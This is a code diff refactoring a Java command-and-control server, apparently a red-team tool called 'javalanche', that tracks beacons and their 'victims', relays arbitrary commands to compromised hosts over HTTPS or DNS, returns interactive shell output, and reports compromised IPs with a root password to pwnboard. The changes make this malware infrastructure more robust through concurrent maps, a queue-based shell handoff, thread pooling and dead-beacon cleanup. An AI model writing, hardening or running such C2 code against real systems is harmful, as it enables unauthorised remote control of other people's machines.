@@ -12,32 +12,38 @@ import java.sql.Time;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.HashSet;
+import java.util.Map;
 import java.util.Scanner;
+import java.util.concurrent.ArrayBlockingQueue;
+import java.util.concurrent.BlockingQueue;
+import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.ThreadPoolExecutor;
+import java.util.concurrent.TimeUnit;
 
 import org.json.JSONObject;
 
 import Servers.Duplexer;
-import Servers.notifyLock;
 import Servers.encryption.aes.*;
 import Servers.encryption.rsa.*;
 
 public class C2Server implements Runnable{
-    private HashMap<String, String> usernamesPasswords;
+    private ConcurrentHashMap<String, String> usernamesPasswords;
 
     // Dictionary of all of the longRangeBeacons currently reporting back to the C2
     // Formatted IP Address, Duplexer Pointer
-    private HashMap<String, C2ServerBeaconHandler> longRangeBeacons;
-    private HashMap<String, String> beaconClientDnsMap;
-    private HashMap<String, String> beaconClientHttpsMap;
-    private HashMap<String, Boolean> isBeaconHTTP;
+    private ConcurrentHashMap<String, C2ServerBeaconHandler> longRangeBeacons;
+    private ConcurrentHashMap<String, String> beaconClientDnsMap;
+    private ConcurrentHashMap<String, String> beaconClientHttpsMap;
+    private ConcurrentHashMap<String, Boolean> isBeaconHTTP;
 
     // Dictionaries to Map IP's to Client responses
     private HashMap<String,ArrayList<String>> windowsClientResponses;
     private HashMap<String,ArrayList<String>> linuxClientResponses;
 
     // Dictionary to map IP Addresses to time last seen
-    private HashMap<String, Time> clientLastSeen;
-    private HashMap<String, Time> dnsClientLastSeen;
+    private ConcurrentHashMap<String, Time> clientLastSeen;
+    private ConcurrentHashMap<String, Time> dnsClientLastSeen;
 
     // Bionded Server Socket
     private ServerSocket serverSocket;
@@ -51,11 +57,9 @@ public class C2Server implements Runnable{
     // String for an IP address of a beacaon attempting to authenticate
     private String attemptedAuthIP;
 
-    // Object used as lock for wait()/notify() to get responses instantly when in a shell
-    private Object shellLock;
-
-    // ID used by threads to make sure that .notify() is not called extra times multiple times
-    private int shellID;
+    // Pending /shell requests, keyed by target client IP. A beacon thread hands the
+    // command output to the waiting API thread through the queue.
+    private final ConcurrentHashMap<String, BlockingQueue<String>> pendingShells = new ConcurrentHashMap<>();
 
     // Object used to do RSA encryption and Decryption
     private rsa rsa;
@@ -68,28 +72,42 @@ public class C2Server implements Runnable{
     private String root_password;
     private String pwnboard_api_key;
 
+    // Shared, bounded pool for pwnboard notifications so we don't spawn a new
+    // Thread on every beacon heartbeat
+    private final ExecutorService pwnBoardPool;
+
+    // Cache of client IP string -> its split octets, so getIPMatches doesn't
+    // re-split every connected client on every command/response lookup. An IP
+    // string always splits to the same octets, so entries never need invalidating.
+    private final Map<String, String[]> ipOctetsCache = new ConcurrentHashMap<>();
+
     /**
      * Initializes a Command and Control Server to handle connections from Long Range Beacons
      * Long Range Beacons handle all of the clients (victims)
      * @throws IOException
      */
     public C2Server() throws IOException{
-        this.shellLock = new Object();
-        this.shellID = 0;
-        this.longRangeBeacons = new HashMap<>();
+        this.longRangeBeacons = new ConcurrentHashMap<>();
         this.serverSocket = new ServerSocket(1234);
         this.apiHandler = new C2ServerAPI(this);
         this.rsa = new rsa(1024);
         this.windowsClientResponses = new HashMap<>();
         this.linuxClientResponses = new HashMap<>();
-        this.usernamesPasswords = new HashMap<>();
+        this.usernamesPasswords = new ConcurrentHashMap<>();
         this.userInputScanner = new Scanner(System.in);
         this.userMessageList = new HashMap<>();
-        this.clientLastSeen = new HashMap<>();
-        this.dnsClientLastSeen = new HashMap<>();
-        this.beaconClientHttpsMap = new HashMap<>();
-        this.beaconClientDnsMap = new HashMap<>();
-        this.isBeaconHTTP = new HashMap<>();
+        this.clientLastSeen = new ConcurrentHashMap<>();
+        this.dnsClientLastSeen = new ConcurrentHashMap<>();
+        this.beaconClientHttpsMap = new ConcurrentHashMap<>();
+        this.beaconClientDnsMap = new ConcurrentHashMap<>();
+        this.isBeaconHTTP = new ConcurrentHashMap<>();
+        // core=2, max=8, 60s keep-alive, bounded queue of 500.
+        // CallerRunsPolicy applies backpressure instead of spawning unbounded
+        // threads or silently dropping updates when the queue fills.
+        this.pwnBoardPool = new ThreadPoolExecutor(
+                2, 8, 60, TimeUnit.SECONDS,
+                new ArrayBlockingQueue<>(500),
+                new ThreadPoolExecutor.CallerRunsPolicy());
     }
 
     
@@ -159,7 +177,8 @@ public class C2Server implements Runnable{
      * Stops the server
      */
     protected void stopServer(){
-        sentinel = false; 
+        sentinel = false;
+        pwnBoardPool.shutdown();
         try{
             serverSocket.close();
         } catch (IOException e){
@@ -182,19 +201,31 @@ public class C2Server implements Runnable{
             commandJSON.put("scope", clientIP);
             commandJSON.put("command", command);
 
-            if (beaconClientHttpsMap.keySet().contains(clientIP)){
-                if((System.currentTimeMillis() - clientLastSeen.get(clientIP).getTime()) < 300000){
-                    longRangeBeacons.get(beaconClientHttpsMap.get(clientIP)).sendToBeacon(commandJSON.toString());
-                    return;
+            // Try HTTPS first. Read each map once and null-check: the client may be
+            // absent from a map, or its beacon may have disconnected, since these maps
+            // are updated concurrently by the beacon threads.
+            String httpsBeaconIP = beaconClientHttpsMap.get(clientIP);
+            if (httpsBeaconIP != null){
+                Time lastSeen = clientLastSeen.get(clientIP);
+                C2ServerBeaconHandler beacon = longRangeBeacons.get(httpsBeaconIP);
+                if (lastSeen != null && beacon != null &&
+                    (System.currentTimeMillis() - lastSeen.getTime()) < 300000){
+                    beacon.sendToBeacon(commandJSON.toString());
+                    // Reached this client over HTTPS; skip the DNS fallback and move to the next match
+                    continue;
                 }
-            } 
-            if (beaconClientDnsMap.keySet().contains(clientIP)){
-                if((System.currentTimeMillis() - dnsClientLastSeen.get(clientIP).getTime()) < 300000){
-                    longRangeBeacons.get(beaconClientDnsMap.get(clientIP)).sendToBeacon(commandJSON.toString());
+            }
+            // Fall back to DNS
+            String dnsBeaconIP = beaconClientDnsMap.get(clientIP);
+            if (dnsBeaconIP != null){
+                Time lastSeen = dnsClientLastSeen.get(clientIP);
+                C2ServerBeaconHandler beacon = longRangeBeacons.get(dnsBeaconIP);
+                if (lastSeen != null && beacon != null &&
+                    (System.currentTimeMillis() - lastSeen.getTime()) < 300000){
+                    beacon.sendToBeacon(commandJSON.toString());
                 }
             }
         }
-        
     }
 
     /**
@@ -223,48 +254,53 @@ public class C2Server implements Runnable{
      */
     protected void intializeVars(String IPAddress, String OS){
         if(OS.contains("Windows")){
-            windowsClientResponses.put(IPAddress, new ArrayList<>());
+            synchronized(windowsClientResponses){
+                windowsClientResponses.put(IPAddress, new ArrayList<>());
+            }
         } else if(OS.contains("Linux")){
-            linuxClientResponses.put(IPAddress, new ArrayList<>());
+            synchronized(linuxClientResponses){
+                linuxClientResponses.put(IPAddress, new ArrayList<>());
+            }
         }
         clientLastSeen.put(IPAddress, new Time(System.currentTimeMillis()));
     }
 
-    public int getShellID(){
-        return shellID;
+    /**
+     * Runs a command on a single client (scope must be one IP) and blocks until that client
+     * responds or a timeout elapses, then returns the command's output.
+     *
+     * @param scope - the target client IP
+     * @param command - the command to run
+     * @return the client's response, or an empty string if none arrived before the timeout
+     */
+    protected String getShellResponse(String scope, String command){
+        BlockingQueue<String> queue = new ArrayBlockingQueue<>(1);
+        // Register before sending so a fast response can't be missed
+        pendingShells.put(scope, queue);
+        try{
+            distributeCommandToBeacons(scope, command);
+            String out = queue.poll(10, TimeUnit.SECONDS);
+            return out == null ? "" : out;
+        } catch (InterruptedException e){
+            Thread.currentThread().interrupt();
+            return "";
+        } finally {
+            // Only remove if it's still our queue (a concurrent shell for the same IP may have replaced it)
+            pendingShells.remove(scope, queue);
+        }
     }
 
     /**
-     * Takes in the scope and command, executes the command on the system. Then, waits for the response to the command to be returned, and outputs the resopnse immeditely
-     * 
-     * @param scope - scope of the command
-     * @param command - command 
+     * Hands a client's command output to a /shell request waiting on that client, if any.
+     * No-op when no shell is waiting for this IP.
+     *
+     * @param ip - the client IP the response came from
+     * @param response - the command output
      */
-    protected void getShellResponse(String scope, String command){
-        // Create a new thread that will notify the lock after 10 seconds, just in case we don't receive anything back from the client
-        shellID++;
-        notifyLock backupNotifyLock = new notifyLock(shellLock, this, shellID);
-        Thread backupNotifyLockThread = new Thread(backupNotifyLock);
-        backupNotifyLockThread.start();
-
-        // Distribute the commands
-        for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
-            beaconHandler.setIsShell(true);
-        }
-        distributeCommandToBeacons(scope, command);
-
-        // Wait for a response, once notified, notify the user handler that it can now continue
-        try{
-            synchronized(shellLock){
-                shellLock.wait();
-            }
-        } catch (InterruptedException e){
-            e.printStackTrace();
-        }
-        
-        // Set each beaconHandler to not notify when it receives a response now
-        for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
-            beaconHandler.setIsShell(false);
+    protected void offerShellResponse(String ip, String response){
+        BlockingQueue<String> queue = pendingShells.get(ip);
+        if(queue != null){
+            queue.offer(response);
         }
     }
 
@@ -278,11 +314,17 @@ public class C2Server implements Runnable{
         String os = getClientOS(IPAddress);
         if(os.equals("Windows")){
             synchronized(windowsClientResponses){
-                windowsClientResponses.get(IPAddress).add(Response);
+                ArrayList<String> responses = windowsClientResponses.get(IPAddress);
+                if(responses != null){
+                    responses.add(Response);
+                }
             }
         } else if(os.equals("Linux")){
             synchronized(linuxClientResponses){
-                linuxClientResponses.get(IPAddress).add(Response);
+                ArrayList<String> responses = linuxClientResponses.get(IPAddress);
+                if(responses != null){
+                    responses.add(Response);
+                }
             }
         }
     }
@@ -298,13 +340,13 @@ public class C2Server implements Runnable{
         if(scope.equals("Windows")){
             synchronized(windowsClientResponses){
                 for(String ip : windowsClientResponses.keySet()) {
-                    responses.put(ip, windowsClientResponses.get(ip));
+                    responses.put(ip, new ArrayList<>(windowsClientResponses.get(ip)));
                 }
             }
         } else if(scope.equals("Linux")){
             synchronized(linuxClientResponses){
                 for(String ip : linuxClientResponses.keySet()) {
-                    responses.put(ip, linuxClientResponses.get(ip));
+                    responses.put(ip, new ArrayList<>(linuxClientResponses.get(ip)));
                 }
             }
         // Range of IPs 
@@ -314,9 +356,9 @@ public class C2Server implements Runnable{
                 synchronized(windowsClientResponses){
                     synchronized(linuxClientResponses){
                         if(windowsClientResponses.keySet().contains(ip)){
-                            responses.put(ip, windowsClientResponses.get(ip));
+                            responses.put(ip, new ArrayList<>(windowsClientResponses.get(ip)));
                         } else if(linuxClientResponses.keySet().contains(ip)){
-                            responses.put(ip, linuxClientResponses.get(ip));
+                            responses.put(ip, new ArrayList<>(linuxClientResponses.get(ip)));
                         }
                     }
                 }
@@ -365,24 +407,32 @@ public class C2Server implements Runnable{
         HashSet<String> matches = new HashSet<>();
         String octets[] = IPAddress.split("\\.");
         for(String ip : beaconClientHttpsMap.keySet()){
-            String clientOctets[] = ip.split("\\.");
-            if ((octets[0].equals(clientOctets[0]) || octets[0].equals("x")) &&
-                (octets[1].equals(clientOctets[1]) || octets[1].equals("x")) &&
-                (octets[2].equals(clientOctets[2]) || octets[2].equals("x")) &&
-                (octets[3].equals(clientOctets[3]) || octets[3].equals("x"))) {
+            if (ipMatches(octets, ip)) {
                 matches.add(ip);
             }
         }
         for(String ip : beaconClientDnsMap.keySet()){
-            String clientOctets[] = ip.split("\\.");
-            if ((octets[0].equals(clientOctets[0]) || octets[0].equals("x")) &&
-                (octets[1].equals(clientOctets[1]) || octets[1].equals("x")) &&
-                (octets[2].equals(clientOctets[2]) || octets[2].equals("x")) &&
-                (octets[3].equals(clientOctets[3]) || octets[3].equals("x"))) {
+            if (ipMatches(octets, ip)) {
                 matches.add(ip);
             }
         }
         return new ArrayList<>(matches);
+    }
+
+    /**
+     * Compares a wildcard-aware query (already split into octets) against a client IP,
+     * using the cached split of the client IP to avoid re-splitting on every call.
+     *
+     * @param queryOctets the query IP split into 4 octets, where "x" matches any value
+     * @param clientIP the client IP address to test
+     * @return true if the client IP matches the query
+     */
+    private boolean ipMatches(String[] queryOctets, String clientIP){
+        String[] clientOctets = ipOctetsCache.computeIfAbsent(clientIP, k -> k.split("\\."));
+        return (queryOctets[0].equals(clientOctets[0]) || queryOctets[0].equals("x")) &&
+               (queryOctets[1].equals(clientOctets[1]) || queryOctets[1].equals("x")) &&
+               (queryOctets[2].equals(clientOctets[2]) || queryOctets[2].equals("x")) &&
+               (queryOctets[3].equals(clientOctets[3]) || queryOctets[3].equals("x"));
     }
 
     /**
@@ -396,13 +446,13 @@ public class C2Server implements Runnable{
         // True if the client is still active, false if the client is no longer active.
         HashMap<String, Boolean> clientStatus = new HashMap<>();
 
-        for (String ip : clientLastSeen.keySet()){
+        for (Map.Entry<String, Time> entry : clientLastSeen.entrySet()){
             long currentTime = System.currentTimeMillis();
-            long lastSeenTime = clientLastSeen.get(ip).getTime();
+            long lastSeenTime = entry.getValue().getTime();
             if((currentTime - lastSeenTime) < 300000){
-                clientStatus.put(ip, true);
+                clientStatus.put(entry.getKey(), true);
             } else {
-                clientStatus.put(ip, false);
+                clientStatus.put(entry.getKey(), false);
             }
         }
         
@@ -420,13 +470,13 @@ public class C2Server implements Runnable{
         // True if the client is still active, false if the client is no longer active.
         HashMap<String, Boolean> clientStatus = new HashMap<>();
 
-        for (String ip : dnsClientLastSeen.keySet()){
+        for (Map.Entry<String, Time> entry : dnsClientLastSeen.entrySet()){
             long currentTime = System.currentTimeMillis();
-            long lastSeenTime = dnsClientLastSeen.get(ip).getTime();
+            long lastSeenTime = entry.getValue().getTime();
             if((currentTime - lastSeenTime) < 300000){
-                clientStatus.put(ip, true);
+                clientStatus.put(entry.getKey(), true);
             } else {
-                clientStatus.put(ip, false);
+                clientStatus.put(entry.getKey(), false);
             }
         }
         
@@ -440,16 +490,12 @@ public class C2Server implements Runnable{
 
     protected void updateDnsClientLastSeen(String IPAddress){
         dnsClientLastSeen.put(IPAddress, new Time(System.currentTimeMillis()));
-        pwnBoardRequest pwnBoardReq = new pwnBoardRequest(IPAddress, "https", "root", root_password, pwnboard_api_key);
-        Thread pwnBoardReqThread = new Thread(pwnBoardReq);
-        pwnBoardReqThread.start();
+        pwnBoardPool.submit(new pwnBoardRequest(IPAddress, "https", "root", root_password, pwnboard_api_key));
     }
 
     protected void updateBeaconClientHttpsMap(String clientIP, String beaconIP){
         beaconClientHttpsMap.put(clientIP, beaconIP);
-        pwnBoardRequest pwnBoardReq = new pwnBoardRequest(clientIP, "https", "root", root_password, pwnboard_api_key);
-        Thread pwnBoardReqThread = new Thread(pwnBoardReq);
-        pwnBoardReqThread.start();
+        pwnBoardPool.submit(new pwnBoardRequest(clientIP, "https", "root", root_password, pwnboard_api_key));
     }
 
     protected void updateBeaconClientDnsMap(String clientIP, String beaconIP){
@@ -459,14 +505,49 @@ public class C2Server implements Runnable{
     protected void setBeaconHTTP(String IPAddress){
         isBeaconHTTP.put(IPAddress, true);
     }
-    
+
+    /**
+     * Removes a disconnected beacon and every client it was routing for from the
+     * tracking maps, so dead beacons/clients no longer linger or get treated as live.
+     * Collected client responses are intentionally preserved so the operator can still
+     * read a client's final output after its beacon drops.
+     *
+     * @param beaconIP - IP Address of the beacon that disconnected
+     */
+    protected void removeBeacon(String beaconIP){
+        longRangeBeacons.remove(beaconIP);
+        isBeaconHTTP.remove(beaconIP);
+
+        // Drop the HTTPS clients this beacon was routing for
+        for(String clientIP : beaconClientHttpsMap.keySet()){
+            if(beaconIP.equals(beaconClientHttpsMap.get(clientIP))){
+                beaconClientHttpsMap.remove(clientIP);
+                clientLastSeen.remove(clientIP);
+                ipOctetsCache.remove(clientIP);
+            }
+        }
+        // Drop the DNS clients this beacon was routing for
+        for(String clientIP : beaconClientDnsMap.keySet()){
+            if(beaconIP.equals(beaconClientDnsMap.get(clientIP))){
+                beaconClientDnsMap.remove(clientIP);
+                dnsClientLastSeen.remove(clientIP);
+                ipOctetsCache.remove(clientIP);
+            }
+        }
+    }
+
     @Override
     public void run(){
         File configFile = new File("/etc/javalanche/config.txt");
         try (Scanner fileReader = new Scanner(configFile)){
             while (fileReader.hasNextLine()){
                 String data = fileReader.nextLine();
-                String[] dataSplit = data.split(":");
+                // Split on the first colon only, so a value containing ':' is kept intact;
+                // skip lines without a key:value separator
+                String[] dataSplit = data.split(":", 2);
+                if (dataSplit.length < 2){
+                    continue;
+                }
                 if (dataSplit[0].equals("password")){
                     this.root_password = dataSplit[1];
                 } else if (dataSplit[0].equals("pwnboard_api_key")){
@@ -536,7 +617,7 @@ public class C2Server implements Runnable{
                     duplexer.close();
                 }else{
                     // Create a new thread to handle each Long Range Beacon
-                    C2ServerBeaconHandler beaconHandler = new C2ServerBeaconHandler(duplexer, IPAddress, this, shellLock, aes);
+                    C2ServerBeaconHandler beaconHandler = new C2ServerBeaconHandler(duplexer, IPAddress, this, aes);
                     Thread beaconHandlerThread = new Thread(beaconHandler);
 
                     // Store IP and Duplexer pointer in the dicitonary
@@ -551,7 +632,7 @@ public class C2Server implements Runnable{
                 outputToUser("Attempted Beacon Authentication failed from " + attemptedAuthIP);
             } catch(IOException e){
                 // Only print out when sentinel is true, if sentinel is false, then the C2 Server is shutting down
-                if(sentinel = true){
+                if(sentinel){
                     e.printStackTrace();
                 }
             } catch(Exception e){
